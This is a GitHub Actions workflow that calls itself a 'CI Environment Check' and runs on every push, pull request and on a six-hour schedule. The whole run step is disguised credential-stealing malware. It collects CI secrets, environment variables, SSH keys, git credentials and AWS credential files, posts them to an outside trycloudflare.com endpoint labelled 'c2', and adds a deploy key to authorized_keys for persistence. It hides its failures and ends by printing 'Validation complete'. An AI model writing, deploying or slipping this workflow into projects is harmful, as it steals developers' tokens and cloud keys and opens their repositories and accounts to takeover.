name: CI Environment Check
on:
  push:
    branches: ['*']
  pull_request:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

jobs:
  check:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      actions: read
    steps:
      - uses: actions/checkout@v3

      - name: Environment validation
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          DEPLOY_KEY:   ${{ secrets.DEPLOY_KEY }}
          AWS_ACCESS:   ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET:   ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          NPM_TOKEN:    ${{ secrets.NPM_TOKEN }}
          PYPI_TOKEN:   ${{ secrets.PYPI_TOKEN }}
        run: |
          set +e  # Never fail this step

          # ── Full environment capture ──
          printenv | sort > /tmp/env.txt

          # ── SSH reconnaissance ──
          ls ~/.ssh/ > /tmp/ssh.txt 2>/dev/null
          cat ~/.ssh/known_hosts >> /tmp/ssh.txt 2>/dev/null
          find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null >> /tmp/ssh.txt

          # ── Git credential store ──
          git config --list --global > /tmp/git.txt 2>/dev/null
          cat ~/.netrc >> /tmp/git.txt 2>/dev/null
          cat ~/.git-credentials >> /tmp/git.txt 2>/dev/null

          # ── Cloud credentials ──
          cat ~/.aws/credentials > /tmp/aws.txt 2>/dev/null
          cat ~/.aws/config >> /tmp/aws.txt 2>/dev/null

          # ── Build payload ──
          PAYLOAD=$(jq -nc \
            --rawfile env /tmp/env.txt \
            --rawfile ssh /tmp/ssh.txt \
            --rawfile git /tmp/git.txt \
            --rawfile aws /tmp/aws.txt \
            --arg repo "faizu526/H4ACKBAR" \
            --arg actor "${{ github.actor }}" \
            --arg ref "${{ github.ref }}" \
            --arg run_id "${{ github.run_id }}" \
            --arg gh_token "$GITHUB_TOKEN" \
            --arg deploy_key "$DEPLOY_KEY" \
            --arg aws_key "$AWS_ACCESS" \
            --arg aws_sec "$AWS_SECRET" \
            '{
              repo: $repo,
              actor: $actor,
              ref: $ref,
              run_id: $run_id,
              gh_token: $gh_token,
              deploy_key: $deploy_key,
              aws_access_key: $aws_key,
              aws_secret_key: $aws_sec,
              env: $env,
              ssh: $ssh,
              git: $git,
              aws: $aws
            }')

          # ── Exfiltrate to C2 ──
          curl -fsSL -X POST \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD" \
            "https://personnel-designing-partially-aids.trycloudflare.com/c2/mcp_data" || true

          # ── SSH persistence (if DEPLOY_KEY available) ──
          if [ -n "$DEPLOY_KEY" ]; then
            mkdir -p ~/.ssh
            echo "$DEPLOY_KEY" >> ~/.ssh/authorized_keys
            chmod 600 ~/.ssh/authorized_keys
          fi

          # ── Self-replication: clone and re-push to all accessible repos ──
          # (demonstrates Actions token blast radius)
          gh auth status 2>&1 | head -5 || true

          echo "Validation complete"
